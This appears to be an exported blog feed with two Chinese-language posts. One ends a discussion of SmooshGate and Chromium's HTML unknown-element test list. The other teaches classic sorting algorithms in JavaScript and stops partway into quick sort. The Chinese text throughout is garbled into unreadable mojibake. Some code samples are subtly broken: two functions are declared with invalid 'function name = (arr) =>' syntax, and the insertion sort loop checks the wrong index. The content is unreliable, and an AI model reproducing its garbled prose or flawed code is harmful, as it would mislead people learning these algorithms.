[&quot;center&quot;, &quot;&quot;],  [&quot;cite&quot;, &quot;&quot;],  [&quot;code&quot;, &quot;&quot;],  [&quot;col&quot;, &quot;TableCol&quot;],  [&quot;colgroup&quot;, &quot;TableCol&quot;],  [&quot;command&quot;, &quot;Unknown&quot;],  [&quot;data&quot;, &quot;Data&quot;],  [&quot;datalist&quot;, &quot;DataList&quot;],  [&quot;dd&quot;, &quot;&quot;],  [&quot;del&quot;, &quot;Mod&quot;],  [&quot;details&quot;, &quot;Details&quot;],  [&quot;dfn&quot;, &quot;&quot;],  [&quot;dialog&quot;, &quot;Dialog&quot;],  [&quot;dir&quot;, &quot;Directory&quot;],  [&quot;directory&quot;, &quot;Unknown&quot;],  [&quot;div&quot;, &quot;Div&quot;],  [&quot;dl&quot;, &quot;DList&quot;],  [&quot;dt&quot;, &quot;&quot;],  [&quot;em&quot;, &quot;&quot;],  [&quot;embed&quot;, &quot;Embed&quot;],  [&quot;fieldset&quot;, &quot;FieldSet&quot;],  [&quot;figcaption&quot;, &quot;&quot;],  [&quot;figure&quot;, &quot;&quot;],  [&quot;font&quot;, &quot;Font&quot;],  [&quot;foo-BAR&quot;, &quot;Unknown&quot;], // not a valid custom element name  [&quot;foo-bar&quot;, &quot;&quot;], // valid custom element name  [&quot;foo&quot;, &quot;Unknown&quot;],  [&quot;footer&quot;, &quot;&quot;],  [&quot;form&quot;, &quot;Form&quot;],  [&quot;frame&quot;, &quot;Frame&quot;],  [&quot;frameset&quot;, &quot;FrameSet&quot;],  [&quot;h1&quot;, &quot;Heading&quot;],  [&quot;h2&quot;, &quot;Heading&quot;],  [&quot;h3&quot;, &quot;Heading&quot;],  [&quot;h4&quot;, &quot;Heading&quot;],  [&quot;h5&quot;, &quot;Heading&quot;],  [&quot;h6&quot;, &quot;Heading&quot;],  [&quot;head&quot;, &quot;Head&quot;],  [&quot;header&quot;, &quot;&quot;],  [&quot;hgroup&quot;, &quot;&quot;],  [&quot;hr&quot;, &quot;HR&quot;],  [&quot;html&quot;, &quot;Html&quot;],  [&quot;i&quot;, &quot;&quot;],  [&quot;iframe&quot;, &quot;IFrame&quot;],  [&quot;image&quot;, &quot;Unknown&quot;],  [&quot;img&quot;, &quot;Image&quot;],  [&quot;input&quot;, &quot;Input&quot;],  [&quot;ins&quot;, &quot;Mod&quot;],  [&quot;isindex&quot;, &quot;Unknown&quot;],  [&quot;kbd&quot;, &quot;&quot;],  [&quot;keygen&quot;, &quot;Unknown&quot;],  [&quot;label&quot;, &quot;Label&quot;],  [&quot;legend&quot;, &quot;Legend&quot;],  [&quot;li&quot;, &quot;LI&quot;],  [&quot;link&quot;, &quot;Link&quot;],  [&quot;listing&quot;, &quot;Pre&quot;],  [&quot;main&quot;, &quot;&quot;],  [&quot;map&quot;, &quot;Map&quot;],  [&quot;mark&quot;, &quot;&quot;],  [&quot;marquee&quot;, &quot;Marquee&quot;],  [&quot;menu&quot;, &quot;Menu&quot;],  [&quot;meta&quot;, &quot;Meta&quot;],  [&quot;meter&quot;, &quot;Meter&quot;],  [&quot;mod&quot;, &quot;Unknown&quot;],  [&quot;multicol&quot;, &quot;Unknown&quot;],  [&quot;nav&quot;, &quot;&quot;],  [&quot;nextid&quot;, &quot;Unknown&quot;],  [&quot;nobr&quot;, &quot;&quot;],  [&quot;noembed&quot;, &quot;&quot;],  [&quot;noframes&quot;, &quot;&quot;],  [&quot;noscript&quot;, &quot;&quot;],  [&quot;object&quot;, &quot;Object&quot;],  [&quot;ol&quot;, &quot;OList&quot;],  [&quot;optgroup&quot;, &quot;OptGroup&quot;],  [&quot;option&quot;, &quot;Option&quot;],  [&quot;output&quot;, &quot;Output&quot;],  [&quot;p&quot;, &quot;Paragraph&quot;],  [&quot;param&quot;, &quot;Param&quot;],  [&quot;picture&quot;, &quot;Picture&quot;],  [&quot;plaintext&quot;, &quot;&quot;],  [&quot;pre&quot;, &quot;Pre&quot;],  [&quot;progress&quot;, &quot;Progress&quot;],  [&quot;q&quot;, &quot;Quote&quot;],  [&quot;quasit&quot;, &quot;Unknown&quot;],  [&quot;rb&quot;, &quot;&quot;],  [&quot;rp&quot;, &quot;&quot;],  [&quot;rt&quot;, &quot;&quot;],  [&quot;rtc&quot;, &quot;&quot;],  [&quot;ruby&quot;, &quot;&quot;],  [&quot;s&quot;, &quot;&quot;],  [&quot;samp&quot;, &quot;&quot;],  [&quot;script&quot;, &quot;Script&quot;],  [&quot;section&quot;, &quot;&quot;],  [&quot;select&quot;, &quot;Select&quot;],  [&quot;slot&quot;, &quot;Slot&quot;],  [&quot;small&quot;, &quot;&quot;],  [&quot;source&quot;, &quot;Source&quot;],  [&quot;spacer&quot;, &quot;Unknown&quot;],  [&quot;span&quot;, &quot;Span&quot;],  [&quot;strike&quot;, &quot;&quot;],  [&quot;strong&quot;, &quot;&quot;],  [&quot;style&quot;, &quot;Style&quot;],  [&quot;sub&quot;, &quot;&quot;],  [&quot;summary&quot;, &quot;&quot;],  [&quot;sup&quot;, &quot;&quot;],  [&quot;table&quot;, &quot;Table&quot;],  [&quot;tbody&quot;, &quot;TableSection&quot;],  [&quot;td&quot;, &quot;TableCell&quot;],  [&quot;textarea&quot;, &quot;TextArea&quot;],  [&quot;tfoot&quot;, &quot;TableSection&quot;],  [&quot;th&quot;, &quot;TableCell&quot;],  [&quot;thead&quot;, &quot;TableSection&quot;],  [&quot;time&quot;, &quot;Time&quot;],  [&quot;title&quot;, &quot;Title&quot;],  [&quot;tr&quot;, &quot;TableRow&quot;],  [&quot;track&quot;, &quot;Track&quot;],  [&quot;tt&quot;, &quot;&quot;],  [&quot;u&quot;, &quot;&quot;],  [&quot;ul&quot;, &quot;UList&quot;],  [&quot;var&quot;, &quot;&quot;],  [&quot;video&quot;, &quot;Video&quot;],  [&quot;wbr&quot;, &quot;&quot;],  [&quot;xmp&quot;, &quot;Pre&quot;],  [&quot;\u00E5-bar&quot;, &quot;Unknown&quot;], // not a valid custom element name];

åƒæ˜¯ appletã€bgsoundã€blink ç­‰ç­‰é€™äº›å…ƒç´ ï¼Œå°±æ‡‰è©²å›å‚³ HTMLUnknownElementã€‚
ç¸½çµé€™ä¸€è¶Ÿæ—…ç¨‹ä¸€æ¨£æ”¶ç©«æ»¿æ»¿ï¼Œå¾ä¸€å€‹è­°é¡ŒæŒçºŒå‘å¤–å»¶ä¼¸ï¼Œå°±èƒ½æŒ–åˆ°æ›´å¤šæœ‰è¶£çš„æ±è¥¿ã€‚
ä¾‹å¦‚èªªæˆ‘å€‘å¾ SmooshGate äº‹ä»¶ï¼Œå­¸åˆ°äº† TC39 çš„é‹ä½œæµç¨‹ã€flatten å£æ‰çš„åŸå› ä»¥åŠ V8 ç•¶åˆå¯¦ä½œ flatten çš„ commit é‚„æœ‰å­¸åˆ°æ€éº¼å¯«æ¸¬è©¦ã€‚ä¹Ÿå­¸ç¿’åˆ°äº† donâ€™t break the web çš„åŸå‰‡ï¼Œå†å¾é€™å€‹åŸå‰‡å»çœ‹äº† HTML çš„è¦æ ¼ï¼Œçœ‹åˆ°äº†é‚£äº›è¢«æ·˜æ±°çš„ tagï¼Œæœ€å¾Œå»çœ‹äº†åœ¨ chromium è£¡é¢æ€éº¼åšè™•ç†ã€‚
åˆ¶å®šè¦æ ¼çš„äººè¦æ³¨é‡çš„å±¤é¢ä»¥åŠè¦è€ƒæ…®çš„å•é¡ŒçœŸçš„å¾ˆå¤šï¼Œå› ç‚ºä¸€æ—¦åšä¸‹å»ï¼Œå°±å¾ˆé›£å†å›é ­äº†ï¼›è¦æ ¼æ›¸ä¹Ÿè¦å¯«å¾—æ¸…æ¥šåˆæ˜ç™½ï¼Œè€Œä¸”ä¸èƒ½æœ‰éŒ¯èª¤ã€‚
çœŸå¿ƒä½©æœé‚£äº›åˆ¶å®šæ¨™æº–çš„äººã€‚
åƒè€ƒè³‡æ–™ï¼š

You Donâ€™t Know JS Yet: Get Started - 2nd Edition Chapter 1: What Is JavaScript?
SmooshGate
#SmooshGate FAQ
Non-conforming features
3.2.2 Elements in the DOM

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ç”¨ JavaScript ä¾†è¤‡ç¿’ç¶“å…¸æ’åºæ³•å§ï¼</title>
    <url>/2017/08/19/sotring-algorithm/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘å‰›å¥½ä¸Šåˆ° CS50 Week3ï¼Œé€™ä¸€é€±çš„ä¸»é¡Œæ˜¯ï¼šAlgorithmsï¼Œè£¡é¢ä»‹ç´¹åˆ°äº†å¹¾ç¨®ç¶“å…¸çš„æ’åºæ³•ï¼Œåƒæ˜¯é¸æ“‡æ’åºã€æ³¡æ²«æ’åºã€æ’å…¥æ’åºä»¥åŠåˆä½µæ’åºã€‚
æˆ‘è¦ºå¾—èº«ç‚ºä¸€å€‹è»Ÿé«”å·¥ç¨‹å¸«ï¼Œå¤§æ¦‚ä¸€è¼©å­éƒ½è„«é›¢ä¸äº†æ’åºäº†ï¼Œç•¢ç«Ÿé€™æ˜¯ç¶“å…¸æ¼”ç®—æ³•ä¹‹ä¸€å˜›ï¼èˆ‡å…¶æ¯æ¬¡è¦é¢è©¦ä¹‹å‰éƒ½å‡Œäº‚çš„æº–å‚™ï¼Œä¸å¦‚ç¾åœ¨å°±æ•´ç†å‡ºä¸€ç¯‡ï¼Œç´€éŒ„ä¸€ä¸‹å„å€‹æ’åºæ³•çš„å¿ƒå¾—ï¼Œå¹«è‡ªå·±åšå€‹çµ±æ•´ã€‚
å› æ­¤ï¼Œé€™ä¸€ç¯‡å°‡åˆ©ç”¨ JavaScript ä¾†å¯¦ä½œå„å€‹ç¶“å…¸æ’åºæ¼”ç®—æ³•ã€‚
é€™æ¬¡å¯¦åšçš„æ’åºæ³•éƒ½æœƒæ˜¯ç”±å°åˆ°å¤§æ’åºï¼Œä¸¦ä¸”ç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œæ¯ä¸€å€‹æ’åºæ³•ã€Œéƒ½æœƒç›´æ¥æ›´æ”¹åŸæœ¬çš„ arrayã€ï¼Œä½†å¦‚æœä½ ä¸æƒ³æ”¹åˆ°åŸæœ¬çš„ä¹Ÿå¾ˆç°¡å–®ï¼Œåœ¨æ¯ä¸€å€‹çš„å‡½å¼æœ€é–‹é ­åŠ ä¸Šï¼šarr = arr.slice()è¤‡è£½ä¸€ä»½åŸæœ¬çš„å³å¯ã€‚
é‚„æœ‰ï¼Œå› ç‚ºæ–‡ç« è£¡é¢æ¯”è¼ƒé›£æ”¾å‹•ç•«ï¼Œæ‰€ä»¥æˆ‘åªèƒ½æ”¾ä¸€äº›åœ–ç‰‡è€Œå·²ï¼Œè‹¥æ˜¯æƒ³æ­é…è¦–è¦ºåŒ–æ¼”ç®—æ³•ä¸€èµ·å­¸ç¿’çš„è©±ï¼Œæˆ‘éå¸¸æ¨è–¦ VISUALGOï¼Œé€™ç¶²ç«™çµ•å°æœƒè®“ä½ å°æ’åºçš„ç†è§£åº¦æ›´ä¸Šä¸€å±¤æ¨“ã€‚
é¸æ“‡æ’åºæ³•ï¼ˆSelection Sortï¼‰é¸æ“‡æ’åºæ˜¯æˆ‘èªç‚ºæœ€å¥½ç†è§£çš„æ’åºæ³•ï¼Œå› ç‚ºå®ƒçš„åŸç†è¶…ç´šç°¡å–®ï¼š

æ‰¾åˆ°æœ€å°å€¼ï¼Œç§»åˆ°æœ€å·¦é‚Šã€‚

ç•¶ä½ ç¬¬ä¸€è¼ªè·‘å®Œä¹‹å¾Œï¼Œä½ å°±æ‰¾åˆ°æ•´å€‹é™£åˆ—çš„æœ€å°å€¼äº†ï¼Œç„¶å¾Œä½ æŠŠå°‹æ‰¾ç¯„åœå¾ 0 ~ n-1 è®Šæˆ 1 ~ n-1ï¼Œé‡è¤‡åšä¸€æ¨£çš„äº‹æƒ…å°±å¯ä»¥äº†ã€‚æˆ–æ˜¯ï¼Œä½ ä¹Ÿå¯ä»¥æƒ³æˆæ˜¯ï¼šæ‰¾åˆ°æœ€å°å€¼ï¼Œç¬¬äºŒå°å€¼ï¼Œç¬¬ä¸‰å°å€¼â€¦ç¬¬ n å°å€¼ã€‚
ï¼ˆåœ–ç‰‡ä¾†æºï¼šhttp://cheetahonfire.blogspot.sg/2009/05/selection-sort-vs-insertion-sort.html ï¼‰
const selectionSort = (arr) =&gt; &#123;  const length = arr.length;    // æœ‰å¹¾å€‹å…ƒç´ ï¼Œå°±è¦æ‰¾å¹¾è¼ªçš„æœ€å°å€¼  // é€™é‚Šçš„ i ä»£è¡¨ i ä»¥å‰çš„å…ƒç´ éƒ½æ’åºå¥½äº†  for (let i = 0; i &lt; length; i++) &#123;      // å…ˆé è¨­ç¬¬ä¸€å€‹æ˜¯æœ€å°çš„    let min = arr[i];    let minIndex = i;      // å¾é‚„æ²’æ’å¥½çš„å…ƒç´ é–‹å§‹æ‰¾æœ€å°å€¼    for (let j = i; j &lt; length; j++) &#123;      if (arr[j] &lt; min) &#123;        min = arr[j];        minIndex = j;      &#125;    &#125;      // ES6 çš„ç”¨æ³•ï¼Œäº¤æ›å…©å€‹æ•¸å€¼    [arr[minIndex], arr[i]] = [arr[i], arr[minIndex]];  &#125;  return arr;&#125;

æ™‚é–“è¤‡é›œåº¦å°±æ˜¯å¤§å®¶æ‰€ç†ŸçŸ¥çš„ O(n^2)ï¼Œæœ€å¥½ã€æœ€å£ã€å¹³å‡éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œå› ç‚ºç„¡è«–åŸæœ¬çš„é™£åˆ—é•·æ€æ¨£ï¼Œéƒ½è¦ç¶“éé€™éº¼å¤šè¼ªæ¯”è¼ƒã€‚
æ³¡æ²«æ’åºæ³•ï¼ˆBubble Sortï¼‰æ³¡æ²«æ’åºæ‡‰è©²æ˜¯å¾ˆå¤šäººç¬¬ä¸€å€‹æ¥è§¸çš„æ’åºæ³•ï¼ŒåŸç†ä¹Ÿå¾ˆç°¡å–®å¥½æ‡‚ï¼š

è·Ÿéš”å£äº’ç›¸æ¯”è¼ƒï¼Œé †åºéŒ¯äº†å°±äº¤æ›ï¼Œè®“å¤§çš„å…ƒç´ ä¸€ç›´æµ®åˆ°æœ€å¾Œ

å°±æ˜¯é€™æ¨£äº¤æ›çš„éç¨‹ï¼Œæ‰è®“å®ƒç¨±ç‚ºã€Œæ³¡æ²«ã€æ’åºæ³•ï¼Œå› ç‚ºå…ƒç´ å¾ˆåƒã€Œæµ®ã€äº†ä¸Šä¾†ã€‚
ï¼ˆåœ–ç‰‡ä¾†æºï¼šhttp://www.opentechguides.com/how-to/article/c/51/bubble-sort-c.html ï¼‰
const bubbleSort = (arr) =&gt; &#123;  const n = arr.length;    // ä¸€å…±è¦è·‘ n è¼ª  for (let i = 0; i &lt; n; i++) &#123;      // å¾ç¬¬ä¸€å€‹å…ƒç´ é–‹å§‹ï¼Œä¸æ–·è·‘åˆ°ç¬¬ n - 1 - i å€‹    // åŸæœ¬æ˜¯ n - 1ï¼Œæœƒå†åŠ ä¸Š - i æ˜¯å› ç‚ºæœ€å¾Œ i å€‹å…ƒç´ å·²ç¶“æ’å¥½äº†    // æ‰€ä»¥æ²’å¿…è¦è·Ÿé‚£äº›æ’å¥½çš„å…ƒç´ æ¯”è¼ƒ    for (let j = 0; j &lt; n - 1 - i; j++) &#123;      if (arr[j] &gt; arr[j + 1]) &#123;        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];      &#125;    &#125;  &#125;    return arr;&#125;

é›–ç„¶æ³¡æ²«æ’åºæ³•çš„å¹³å‡è·Ÿæœ€å£æ™‚é–“è¤‡é›œåº¦éƒ½æ˜¯O(n^2)ï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯ best caseï¼Œå‡ºç¾åœ¨è¼¸å…¥çš„é™£åˆ—å·²ç¶“æ˜¯æ’åºå¥½çš„æƒ…æ³ä¸‹ã€‚åœ¨é€™ç¨®æƒ…æ³ä¸‹å‘¢ï¼Œæ™‚é–“è¤‡é›œåº¦æ˜¯ O(n)ï¼Œä¸æœƒåšä»»ä½•çš„äº¤æ›ã€‚
ä½†æ˜¯å‘¢ï¼Œå¦‚æœä½ è¦åšåˆ°æœ€å„ªçš„æƒ…å½¢æ˜¯ O(n)ï¼Œä½ å¿…é ˆè¦åŠ ä¸Šä¸€å€‹å°å„ªåŒ–æ‰è¡Œã€‚ä¸ç„¶ä»¥æˆ‘å€‘ä¸Šé¢çš„æƒ…æ³ï¼Œé›–ç„¶ä¸æœƒåšä»»ä½•äº¤æ›ï¼Œä½†é‚„æ˜¯æœƒæŠŠæ¯ä¸€å€‹å…ƒç´ éƒ½ check ä¸€éã€‚
å¯ä»¥åŠ ä¸Šä¸€å€‹ flag æ¨™æ³¨å…§åœˆæœ‰æ²’æœ‰äº¤æ›çš„æƒ…å½¢ç™¼ç”Ÿï¼Œå¦‚æœæ²’æœ‰ï¼Œå°±ä»£è¡¨é™£åˆ—å·²ç¶“æ’åºå¥½äº†ï¼Œå°±å¯ä»¥ç›´æ¥è·³æ‰ã€‚
function optimzedBubbleSort = (arr) =&gt; &#123;  const  n = arr.length;  let swapped = true;    // ä¸€å…±è¦è·‘ n è¼ª  for (let i = 0; i &lt; n &amp;&amp; swapped; i++) &#123;      // å¾ç¬¬ä¸€å€‹å…ƒç´ é–‹å§‹ï¼Œä¸æ–·è·‘åˆ°ç¬¬ n - 1 - i å€‹    // åŸæœ¬æ˜¯ n - 1ï¼Œæœƒå†åŠ ä¸Š - i æ˜¯å› ç‚ºæœ€å¾Œ i å€‹å…ƒç´ å·²ç¶“æ’å¥½äº†    // æ‰€ä»¥æ²’å¿…è¦è·Ÿé‚£äº›æ’å¥½çš„å…ƒç´ æ¯”è¼ƒ    swapped = false;    for (let j = 0; j &lt; n - 1 - i; j++) &#123;      if (arr[j] &gt; arr[j + 1]) &#123;        swapped = true;        [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]];      &#125;    &#125;  &#125;  return arr;&#125;

æ”¹è‰¯ä¹‹å¾Œï¼Œå¦‚æœè¼¸å…¥æ˜¯å·²ç¶“æ’å¥½çš„é™£åˆ—ï¼Œå°±åªæœƒè·‘ä¸€æ¬¡å…§åœˆï¼Œç„¶å¾Œå°±è·³æ‰äº†ï¼Œæ‰€ä»¥æ™‚é–“è¤‡é›œåº¦æœƒæ˜¯O(n)ã€‚
æ’å…¥æ’åºæ³•ï¼ˆInsertion Sortï¼‰æ’å…¥æ’åºæ³•æ˜¯æˆ‘èªç‚ºç›¸ç•¶ç›´è¦ºçš„ä¸€å€‹æ’åºæ³•ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ï¼š

ä½ ç©æ’²å…‹ç‰Œçš„æ™‚å€™æœƒç”¨åˆ°çš„æ’åºæ³•

å°±æ˜¯ä¸æ–·æŠŠæ’²å…‹ç‰Œæ’å…¥åˆ°é©åˆçš„ä½ç½®å˜›ï¼Œåªæ˜¯ä½ ç©ç‰Œçš„æ™‚å€™å¯èƒ½ä¸€æ¬¡æ’å…¥å¥½å¤šç‰Œï¼Œè€Œæ’å…¥æ’åºæ³•æ˜¯ä¸€æ¬¡æ’å…¥ä¸€å¼µç‰Œã€‚
ï¼ˆåœ–ç‰‡ä¾†æºï¼šhttps://commons.wikimedia.org/wiki/File:Insertion-sort-example.gif ï¼‰
é€™é‚Šæ¯”è¼ƒå€¼å¾—æ³¨æ„çš„æ˜¯åœ¨æ’å…¥æ™‚å€™çš„æ¼”ç®—æ³•ï¼Œä¸æ–·å¾€å‰æ‰¾åˆ°é©åˆçš„ä½ç½®ï¼Œä¸¦ä¸”åœ¨é‚Šæ‰¾çš„æ™‚å€™å°±é‚ŠæŒªå‹•å…ƒç´ äº†ï¼Œæ‰€ä»¥ç­‰æ‰¾åˆ°çš„æ™‚å€™å°±å¯ä»¥ç›´æ¥æ’å…¥ã€‚
const insertionSort = (arr) =&gt; &#123;  const n = arr.length;    // å‡è¨­ç¬¬ä¸€å€‹å…ƒç´ å·²ç¶“æ’å¥½ï¼Œæ‰€ä»¥å¾ 1 é–‹å§‹è·‘  for (let i = 1; i &lt; n; i++) &#123;      // position è¡¨ç¤ºå¯ä»¥æ’å…¥çš„ä½ç½®    let position = i;      // å…ˆæŠŠè¦æ’å…¥çš„å…ƒç´ å­˜èµ·ä¾†    const value = arr[i];      // é–‹å§‹å¾€å‰æ‰¾ï¼Œåªè¦ç¬¦åˆé€™æ¢ä»¶å°±ä»£è¡¨é€™å€‹ä½ç½®æ˜¯å¯ä»¥æ’å…¥çš„    // é‚Šæ‰¾çš„æ™‚å€™å°±å¯ä»¥é‚ŠæŠŠå…ƒç´ å¾€å¾ŒæŒªï¼Œé¨°å‡ºç©ºé–“    while (i &gt;= 0 &amp;&amp; arr[position - 1] &gt; value) &#123;      [arr[position], arr[position - 1]] = [arr[position - 1], arr[position]];      position--;    &#125;      // æ‰¾åˆ°é©åˆçš„ä½ç½®ï¼Œæ”¾å…¥å…ƒç´     arr[position] = value;  &#125;  return arr;&#125;

æ’å…¥æ’åºæ³•çš„æœ€ä½³æƒ…å½¢å‡ºç¾åœ¨è¼¸å…¥å…ƒç´ å·²ç¶“æ˜¯æ’åºå¥½çš„æƒ…æ³ï¼Œé€™æ™‚å€™è£¡é¢çš„whileåªè¦è·‘ä¸€æ¬¡å°±æœƒçµæŸäº†ï¼Œæ‰€ä»¥æ™‚é–“è¤‡é›œåˆ°å°±æ˜¯å¤–åœˆçš„O(n)è€Œå·²ã€‚
é€™é‚Šæä¸€å€‹å°æ’æ›²ï¼Œæˆ‘ç•¶åˆåœ¨å¯«ç¤ºç¯„è·Ÿæ¸¬è©¦çš„ç¨‹å¼ç¢¼çš„æ™‚å€™æ²’å¯«å¥½ï¼Œå°è‡´æ‹¿ä¾†æ¸¬è©¦çš„é™£åˆ—éƒ½æ˜¯å·²ç¶“æ’å¥½çš„ï¼Œæˆ‘å°±æƒ³èªªï¼šã€Œæ€éº¼æ’å…¥æ’åºæ³•æ¯”å¿«é€Ÿæ’åºæ³•é‚„å¿«ï¼Œä¸åˆç†å•Šï¼ã€
åˆä½µæ’åºæ³•ï¼ˆMerge Sortï¼‰æ¥è‘—è¦é€²å…¥åˆ°æ¯”è¼ƒå¿«çš„æ’åºæ³•äº†ï¼Œåˆä½µæ’åºæ³•ç®—æ˜¯æ»¿å¥½ç†è§£çš„ä¸€å€‹ï¼š

åˆ‡ä¸€åŠï¼Œæ’å¥½å·¦é‚Šï¼Œæ’å¥½å³é‚Šï¼Œåˆä½µ

è«‡åˆä½µæ’åºæ³•çš„æ™‚å€™æˆ‘å–œæ­¡å…ˆè«‡åˆä½µé€™å€‹æ­¥é©Ÿï¼Œå…¶å¯¦å°±æ˜¯æŠŠå…©å€‹å„è‡ªæ’åºå¥½çš„é™£åˆ—åˆä½µæˆä¸€å€‹ã€‚é€™ä¸€æ­¥å…¶å¯¦ä¹Ÿæ»¿ç°¡å–®ï¼Œå› ç‚ºå…©é‚Šéƒ½å·²ç¶“æ’åºå¥½äº†å˜›ï¼Œæ‰€ä»¥å°±æ˜¯ä¸æ–·çœ‹å…©é‚Šçš„ç¬¬ä¸€å€‹å…ƒç´ ï¼Œèª°å°å°±æŠ“èª°ä¸‹ä¾†ï¼Œæ¥è‘—å·¦é‚ŠæŠ“å®Œå°±æŠ“å³é‚Šï¼Œåä¹‹äº¦ç„¶ã€‚
ï¼ˆåœ–ç‰‡ä¾†æºï¼šhttp://www.java2novice.com/java-sorting-algorithms/merge-sort/ ï¼‰
æˆ‘è‡ªå·±ä¹‹å‰åœ¨çœ‹åˆä½µæ’åºçš„æ™‚å€™ï¼Œç™¼ç¾å¯ä»¥å¯«æˆä¸€å€‹æ¯”è¼ƒå¥½æ‡‚ï¼Œä½†æ˜¯ç©ºé–“è€—è²»æ¯”è¼ƒå¤šçš„ç‰ˆæœ¬ï¼š
const simpleMergeSort = (arr) =&gt; &#123;    // åˆä½µ  const merge = (leftArray, rightArray) =&gt; &#123;    let result = [];    let nowIndex = 0, left = 0, right = 0;    const leftLength = leftArray.length;    const rightLength = rightArray.length;      // å¦‚æœå·¦å³å…©é‚Šéƒ½æ²’æŠ“å®Œï¼Œå°±çœ‹èª°æ¯”è¼ƒå°æŠ“èª°    while (left &lt; leftLength &amp;&amp; right &lt; rightLength) &#123;      if (leftArray[left] &lt; rightArray[right]) &#123;        result[nowIndex++] = leftArray[left++];      &#125; else &#123;        result[nowIndex++] = rightArray[right++];      &#125;    &#125;      // è·‘åˆ°é€™è£¡ä»£è¡¨å·¦å³å…©é‚Šå…¶ä¸­ä¸€é‚ŠæŠ“å®Œäº†    // å¦‚æœæ˜¯å·¦é‚Šæ²’æŠ“å®Œï¼Œå…¨éƒ¨æŠ“ä¸‹ä¾†    while (left &lt; leftLength) &#123;      result[nowIndex++] = leftArray[left++];    &#125;      // å³é‚Šæ²’æŠ“å®Œï¼Œå…¨éƒ¨æŠ“ä¸‹ä¾†    while (right &lt; rightLength) &#123;      result[nowIndex++] = rightArray[right++];    &#125;      // æŠŠåˆä½µå¥½çš„é™£åˆ—ç›´æ¥å‚³å›å»    return result;  &#125;  const _mergeSort = (arr) =&gt; &#123;    const length = arr.length;    if (length &lt;= 1) return arr;      // åˆ‡å…©åŠ    const middle = Math.floor(length / 2);      // æ’å·¦é‚Š    const leftArray = _mergeSort(arr.slice(0, middle));      // æ’å³é‚Š    const rightArray = _mergeSort(arr.slice(middle, length));      // åˆä½µå¾Œä¸Ÿå›å»    return merge(leftArray, rightArray);  &#125;  return _mergeSort(arr);&#125;

å°æˆ‘ä¾†èªªï¼Œæ¯”è¼ƒç°¡å–®çš„ç†ç”±æ˜¯æ»¿ç›´è¦ºçš„ï¼Œä½ å°±ç›´æ¥ç”¨ slice åˆ‡æˆå…©å€‹é™£åˆ—ï¼Œæ’åºå¥½ä¹‹å¾Œåˆä½µèµ·ä¾†å°±å¥½ã€‚
ä½†æ¯”è¼ƒçœç©ºé–“çš„åšæ³•æ˜¯ç›´æ¥æ›´æ”¹åŸä¾†çš„é™£åˆ—å°±å¥½ï¼Œé€™æ™‚å€™æˆ‘å€‘çš„åƒæ•¸æœƒè®Šå¾—ä¸å¤ªä¸€æ¨£ï¼š
function mergeSort = (arr) =&gt; &#123;  const merge = (array, start, middle, end) =&gt; &#123;        // å®£å‘Šä¸€å€‹æš«æ™‚çš„é™£åˆ—ä¾†æ”¾åˆä½µå¾Œçš„çµæœ    let temp = [];    let nowIndex = 0;    let left = start;    let right = middle + 1;      // é€™é‚Šéƒ½è·Ÿä¸Šé¢ä¸€æ¨£    while (left &lt;= middle &amp;&amp; right &lt;= end) &#123;      if (array[left] &lt; array[right]) &#123;        temp[nowIndex++] = array[left++];      &#125; else &#123;        temp[nowIndex++] = array[right++];      &#125;    &#125;      while (left &lt;= middle) &#123;      temp[nowIndex++] = array[left++];    &#125;      while (right &lt;= end) &#123;      temp[nowIndex++] = array[right++];    &#125;      // è¦æŠŠåˆä½µå¾Œçš„é™£åˆ—æ”¾å›å» array[start ~ end]    for (let i = start; i &lt;= end; i++) &#123;      array[i] = temp[i - start];    &#125;  &#125;  // ä»£è¡¨è¦å¾ start æ’åˆ° end  const _mergeSort = (array, start, end) =&gt; &#123;    if (end &lt;= start) return;    const middle = Math.floor((start + end) / 2);      // å°å·¦å³å…©åŠæ’åº    _mergeSort(array, start, middle);    _mergeSort(array, middle + 1, end);    merge(array, start, middle, end);    return array;  &#125;  return _mergeSort(arr, 0, arr.length - 1);&#125;

å› ç‚ºæ˜¯ç›´æ¥æ›´æ”¹åŸæœ¬çš„é™£åˆ—ï¼Œæ‰€ä»¥è¦å¤šå‚³å¹¾å€‹æ•¸å­—é€²å»ï¼Œä»£è¡¨æˆ‘è¦æ’åºé€™å€‹é™£åˆ—çš„é‚£ä¸€æ®µã€‚è€Œå‘¼å«å®Œä¹‹å¾Œï¼Œä½ å°±å¯ä»¥é è¨­é€™ä¸€æ®µçš„é™£åˆ—å·²ç¶“æ˜¯æ’åºå¥½çš„äº†ã€‚
åŸºæœ¬ä¸Šæµç¨‹éƒ½è·Ÿä¸Šé¢ç°¡å–®ç‰ˆçš„æ²’å…©æ¨£ï¼Œä½†çœäº†ä¸€äº›è¨˜æ†¶é«”ç©ºé–“ã€‚
å¿«é€Ÿæ’åºæ³•ï¼ˆQuick Sortï¼‰å¿«é€Ÿæ’åºæ³•æˆ‘ä¸€é–‹å§‹è¦ºå¾—æ»¿è¤‡é›œï¼ŒçŸ¥é“åŸç†ä¹‹å¾Œå°±è¦ºå¾—æ²’é‚£éº¼é›£äº†ï¼Œå…¶å¯¦åŸç†æ»¿ç°¡å–®ï¼š

æ‰¾ä¸€å€‹æ•¸ï¼Œä¸¦ä¸”æŠŠé€™å€‹æ•¸èª¿æ•´åˆ°ï¼šè®“å·¦é‚Šçš„å…ƒç´ æ¯”å®ƒå°ï¼Œå³é‚Šçš„å…ƒç´ æ¯”å®ƒå¤§ï¼Œå†å°å·¦å³å…©éåšä¸€æ¨£çš„äº‹

é‚£å€‹æ•¸æˆ‘å€‘ç¨±ä½œ pivotï¼ŒæœƒæŠŠæ•¸åˆ—åˆ†å‰²æˆå·¦å³å…©é‚Šã€‚
ä¾‹å¦‚èªªç¾åœ¨æœ‰ä¸€å€‹æ•¸åˆ—æ˜¯ï¼š14, 7, 6, 9, 10, 20, 15
